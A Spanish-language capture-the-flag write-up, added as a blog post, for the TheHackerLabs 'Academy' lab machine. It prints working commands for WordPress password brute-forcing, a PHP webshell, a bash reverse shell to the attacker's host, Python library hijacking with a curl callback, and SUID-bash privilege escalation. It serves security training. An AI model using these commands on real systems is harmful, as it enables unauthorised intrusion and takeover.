@@ -1,0 +1,188 @@
+---
+layout: post
+title: "Academy"
+date: 2024-06-11 16:25:23
+category: sample
+vm: hackerlabs
+---
+
+<style>
+  .post-content {
+    color: #51c25be1; /* Cambia el color del texto */
+  }
+</style>
+
+<table class="log">
+  <tr>
+    <td rowspan="5"><img src="/notas/public/img/thehackerlabs/thehackerlabs.png" width=260></td>
+    <td></td>
+  </tr>
+  <tr> <td><strong>Máquina:</strong> Academy </td> </tr>
+  <tr> <td><strong>SO:</strong> Linux</td> </tr>
+  <tr> <td><strong>Dificultad:</strong> <span class="easy">Facil</span></td> </tr>
+  <tr> <td><strong><a href="https://thehackerslabs.com/academy/" target="_blank"> Descarga</a></strong></td> </tr>
+</table>
+
+<br>
+
+![img](/notas/public/img/thehackerlabs/Academy/host.png){:.margin}
+
+**1\.** Detecto los equipos activos en la red.
+
+`sudo arp-scan -l`
+
+![img](/notas/public/img/thehackerlabs/Academy/arp.png){:.margin}
+
+**2\.** Escaneo los puertos y detalles de los servicios que corre.
+
+`sudo nmap -p- --open -T5 -sCV --min-rate=5000 -n -Pn 192.168.1.9`
+
+![img](/notas/public/img/thehackerlabs/Academy/nmap.png){:.margin}
+
+**3\.** En la web esta la web por defecto de Apache. 
+
+`http://192.168.1.9`
+
+![img](/notas/public/img/thehackerlabs/Academy/80.png){:.margin}
+
+**4\.** Fuzzing de directorios y ficheros en la web.
+
+`gobuster dir -u http://192.168.1.9/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,php,txt -q`
+
+![img](/notas/public/img/thehackerlabs/Academy/gobuster.png){:.margin}
+
+**5\.** Analizando la web en /wordpress.
+
+_5.1- La pagina no carga correctamente_
+
+`http://192.168.1.9/wordpress/`
+
+![img](/notas/public/img/thehackerlabs/Academy/80wordpress.png){:.margin}
+
+_5.2- En su fuente veo que llama a un dominio_
+
+![img](/notas/public/img/thehackerlabs/Academy/codewordpress.png){:.margin}
+
+_5.3- Agrego el dominio al hosts, ahora la carga es correcta_
+
+`sudo nano /etc/hosts`
+
+`192.168.1.9  academy.thl`
+
+![img](/notas/public/img/thehackerlabs/Academy/hosts.png){:.margin}
+![img](/notas/public/img/thehackerlabs/Academy/80wordpressok.png){:.margin}
+
+**6\.** Sigo con mas fuzzing en la web, no encuentro mucho mas.
+
+`gobuster dir -u http://192.168.1.9/wordpress/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,php,txt -q`
+
+![img](/notas/public/img/thehackerlabs/Academy/gobusterwordpress.png){:.margin}
+
+**7\.** Escaneo vulnerabilidades con wpscan, encuentra un usuario valido.
+
+`wpscan --url http://192.168.1.9/wordpress -e vp,u --api-token='pasteyourapi'`
+
+![img](/notas/public/img/thehackerlabs/Academy/wpscan.png){:.margin}
+
+**8\.** Hago fuerza bruta al login de wordpress.
+
+`wpscan --url http://192.168.1.9/wordpress -U dylan -P /usr/share/wordlists/rockyou.txt`
+
+![img](/notas/public/img/thehackerlabs/Academy/wpsbruteforce.png){:.margin}
+
+**9\.** Accedo al wordpress con las credenciales.
+
+`http://192.168.1.9/wordpress/wp-login.php`
+
+![img](/notas/public/img/thehackerlabs/Academy/wordpresslogin.png){:.margin}
+
+**10\.** Obteniendo una webshell.
+
+_10.1- Clickamos en file manager, y editamos el index.php_
+
+![img](/notas/public/img/thehackerlabs/Academy/filemanager.png){:.margin}
+
+_10.2- Añadimos nuestro codigo para ejecutar webshell_
+
+`shell_exec($_GET["cmd"]);`
+
+![img](/notas/public/img/thehackerlabs/Academy/editindex.png){:.margin}
+
+_10.3- Probamos la ejecucion_
+
+`academy.thl/wordpress/?cmd=cat /etc/passwd`
+
+![img](/notas/public/img/thehackerlabs/Academy/80webshell.png){:.margin}
+
+**11\.** Entablando conexion con una reverse shell.
+
+_11.1- Me pongo en escucha_
+
+`sudo nc -nlvp 443`
+
+![img](/notas/public/img/thehackerlabs/Academy/nc.png){:.margin}
+
+_11.2- Me envio la reverse shell_
+
+`http://academy.thl/wordpress/?cmd=bash -c "bash -i>%26 /dev/tcp/192.168.1.13/443 0>%261"`
+
+![img](/notas/public/img/thehackerlabs/Academy/reverseshell.png){:.margin}
+
+_11.3- Recibo la conexion_
+
+![img](/notas/public/img/thehackerlabs/Academy/ncok.png){:.margin}
+
+**12\.** Encuentro un script python, veo que no especifica la ruta completa de la libreria.
+
+`cd /opt`
+
+`ls`
+
+`cat backup.py`
+
+![img](/notas/public/img/thehackerlabs/Academy/catbackup.png){:.margin}
+
+_\- Aparentemente realiza una conexion por ssh, pero al ejecutar nos da un error_
+
+**13\.** Probando Python Library Hijacking.
+
+_13.1- Creo una script paramiko.py donde hare una peticion a mi servidor local_
+
+`echo -e "import os\nos.system('curl -s http://192.168.1.13/prueba')" > paramiko.py`
+
+`cat paramiko.py`
+
+![img](/notas/public/img/thehackerlabs/Academy/paramikopy.png){:.margin}
+
+_13.2- Veo que si funciona, pero esto no tiene sentido ya que ejecutamos sin privilegio alguno, es como ejecutar el mismo paramiko.py_
+
+`python3 -m http.server 80`
+
+`python3 backup.py`
+
+![img](/notas/public/img/thehackerlabs/Academy/backuppy.png){:.margin}
+
+**14\.** Escalando privilegios.
+
+_14.1- Uso [pspy64](https://github.com/DominicBreuker/pspy/releases) para ver los procesos, al cabo de unos segundos veo que root busca ejecutar /opt/backup.sh_
+`wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 -q` 
+`chmod +x pspy64`
+`./pspy64`
+
+![img](/notas/public/img/thehackerlabs/Academy/pspy64.png){:.margin}
+
+_14.2- Creo el backup.sh con instrucciones para hacer suid el bash_
+`echo "chmod u+s /bin/bash" > backup.sh`
+`chmod +x backup.sh`
+
+![img](/notas/public/img/thehackerlabs/Academy/backupsh.png){:.margin}
+
+_14.3- Esperamos unos segundos para luego ejecutar bash -p_
+`ls -l /bin/bash`
+`bash -p`
+
+![img](/notas/public/img/thehackerlabs/Academy/root.png){:.margin}
+
+<br>
+
+<span class="finish">_Finalizado._</span>
